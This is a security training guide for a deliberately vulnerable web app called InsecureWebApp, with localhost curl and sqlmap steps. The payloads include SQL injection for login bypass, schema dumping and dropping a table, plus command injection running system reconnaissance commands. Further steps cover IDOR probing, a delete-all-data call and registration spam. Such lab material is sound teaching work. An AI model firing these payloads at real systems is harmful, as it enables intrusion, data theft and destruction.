# Testing Guide for Security Vulnerabilities

This guide provides step-by-step instructions for testing each security vulnerability in the InsecureWebApp.

⚠️ **WARNING: Only test these vulnerabilities in a controlled environment. Never attempt these tests on production systems or systems you don't own.**

## Setup for Testing

1. Start the application:
   ```bash
   dotnet run
   ```

2. The API will be available at: `http://localhost:5000` or `https://localhost:5001`

3. Use tools like:
   - **Postman** or **curl** for API testing
   - **Burp Suite** or **OWASP ZAP** for security testing
   - **SQLMap** for SQL injection testing
   - Browser developer tools for client-side testing

## Vulnerability Testing Guide

### 1. SQL Injection (Critical)

#### Test 1: Authentication Bypass
**Location**: `AuthController.Login`

```bash
# Using curl
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@test.com'\'' OR '\''1'\''='\''1'\'' --",
    "password": "anything"
  }'
```

**Expected Result**: Should return a successful login response even with invalid credentials.

#### Test 2: Product Search SQL Injection
**Location**: `ProductsController.GetProducts`

```bash
# Information disclosure
curl "http://localhost:5000/api/products?search=' UNION SELECT 1,@@version,3,4,5,6 --"

# Database structure discovery
curl "http://localhost:5000/api/products?search=' UNION SELECT table_name,column_name,1,2,3,4 FROM information_schema.columns --"
```

#### Test 3: Order Query Injection
**Location**: `OrdersController.GetOrders`

```bash
curl "http://localhost:5000/api/orders?userId=1; DROP TABLE Orders; --"
```

### 2. Command Injection (Critical)

#### Test: System Command Execution
**Location**: `AdminController.ExecuteCommand`

```bash
# Windows commands
curl -X POST http://localhost:5000/api/admin/execute-command \
  -H "Content-Type: application/json" \
  -d '{
    "command": "whoami & hostname & dir"
  }'

# Network reconnaissance
curl -X POST http://localhost:5000/api/admin/execute-command \
  -H "Content-Type: application/json" \
  -d '{
    "command": "ipconfig /all & netstat -an"
  }'

# File system access
curl -X POST http://localhost:5000/api/admin/execute-command \
  -H "Content-Type: application/json" \
  -d '{
    "command": "type C:\\Windows\\System32\\drivers\\etc\\hosts"
  }'
```

**Expected Result**: Should execute system commands and return output.

### 3. Insecure Direct Object References (IDOR)

#### Test 1: Access Other Users' Orders
```bash
# Try different user IDs
curl "http://localhost:5000/api/orders?userId=1"
curl "http://localhost:5000/api/orders?userId=2"
curl "http://localhost:5000/api/orders?userId=999"
```

#### Test 2: Access User Details Without Authorization
```bash
# Access different user profiles
curl "http://localhost:5000/api/auth/users/1"
curl "http://localhost:5000/api/auth/users/2"
curl "http://localhost:5000/api/auth/users/999"
```

### 4. Information Disclosure

#### Test 1: System Information Exposure
```bash
curl "http://localhost:5000/api/admin/system-info"
```

#### Test 2: Database Backup Exposure
```bash
curl "http://localhost:5000/api/admin/database-backup"
```

#### Test 3: Error Information Disclosure
```bash
# Trigger errors to see stack traces
curl "http://localhost:5000/api/products/invalid-id"
curl -X POST http://localhost:5000/api/products \
  -H "Content-Type: application/json" \
  -d '{ "invalid": "data" }'
```

### 5. Weak JWT Implementation

#### Test: JWT Token Analysis
1. Register a user:
```bash
curl -X POST http://localhost:5000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "password": "password123",
    "firstName": "Test",
    "lastName": "User",
    "socialSecurityNumber": "123-45-6789",
    "creditCardNumber": "4111-1111-1111-1111"
  }'
```

2. Login to get JWT:
```bash
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "password": "password123"
  }'
```

3. Decode the JWT at [jwt.io](https://jwt.io) and observe:
   - No expiration time
   - Sensitive data in claims
   - Weak signature

### 6. Mass Assignment

#### Test: Product Creation with Extra Fields
```bash
curl -X POST http://localhost:5000/api/products \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Test Product",
    "description": "Test Description",
    "price": 99.99,
    "stockQuantity": 100,
    "id": 999999,
    "createdAt": "2020-01-01T00:00:00"
  }'
```

### 7. No Rate Limiting

#### Test: Rapid Requests
```bash
# Automated registration spam
for i in {1..100}; do
  curl -X POST http://localhost:5000/api/auth/register \
    -H "Content-Type: application/json" \
    -d "{
      \"email\": \"spam$i@test.com\",
      \"password\": \"password\",
      \"firstName\": \"Spam\",
      \"lastName\": \"User$i\"
    }" &
done
```

### 8. Insecure Data Storage

#### Test: Plain Text Password Verification
1. Register a user
2. Check the database or API response to verify passwords are stored in plain text
3. Use the database backup endpoint to retrieve all user data including passwords

### 9. Missing Authorization

#### Test: Admin Functions Without Authentication
```bash
# Delete all data without authentication
curl -X DELETE "http://localhost:5000/api/admin/delete-all-data?confirm=YES-DELETE-EVERYTHING"

# Create products without authentication
curl -X POST http://localhost:5000/api/products \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Unauthorized Product",
    "price": 1.00
  }'
```

### 10. HTTPS and Transport Security

#### Test: HTTP Traffic Interception
1. Configure a proxy (Burp Suite/OWASP ZAP)
2. Make requests to the application
3. Observe unencrypted traffic containing sensitive data
4. Note that HTTPS redirect is disabled

## Automated Testing with Security Tools

### Using SQLMap for SQL Injection
```bash
# Test login endpoint
sqlmap -u "http://localhost:5000/api/auth/login" \
  --method=POST \
  --data='{"email":"test@test.com","password":"test"}' \
  --headers="Content-Type: application/json" \
  --dbms=mssql

# Test product search
sqlmap -u "http://localhost:5000/api/products?search=test" \
  --dbms=mssql
```

### Using OWASP ZAP
1. Configure ZAP proxy
2. Spider the application
3. Run active security scan
4. Review findings

### Using Burp Suite
1. Configure Burp proxy
2. Browse application through Burp
3. Use Burp Scanner (Professional)
4. Analyze security issues

## Testing Checklist

### Authentication & Session Management
- [ ] SQL injection in login
- [ ] JWT token without expiration
- [ ] Weak JWT secret key
- [ ] Sensitive data in JWT claims
- [ ] No session invalidation
- [ ] Plain text password storage

### Authorization
- [ ] IDOR vulnerabilities
- [ ] Missing authentication on sensitive endpoints
- [ ] Admin functionality without authorization
- [ ] User can access other users' data

### Input Validation
- [ ] SQL injection in multiple endpoints
- [ ] Command injection in admin functions
- [ ] No input validation on user registration
- [ ] Mass assignment vulnerabilities

### Data Protection
- [ ] Sensitive data in API responses
- [ ] Hardcoded connection strings
- [ ] Information disclosure in errors
- [ ] Plain text sensitive data storage

### Infrastructure
- [ ] No HTTPS enforcement
- [ ] Weak CORS configuration
- [ ] No rate limiting
- [ ] Detailed error messages in production

## Expected Learning Outcomes

After testing these vulnerabilities, participants should understand:

1. **Impact of Security Vulnerabilities**
   - How easily systems can be compromised
   - The extent of data that can be exposed
   - Business impact of security failures

2. **Attack Techniques**
   - SQL injection methodology
   - Command injection exploitation
   - IDOR attack patterns
   - Information gathering techniques

3. **Defense Strategies**
   - Input validation importance
   - Authentication and authorization controls
   - Secure configuration practices
   - Error handling best practices

---

**Remember: This testing should only be performed in controlled environments for educational purposes. Always follow responsible disclosure practices and never test systems without explicit permission.**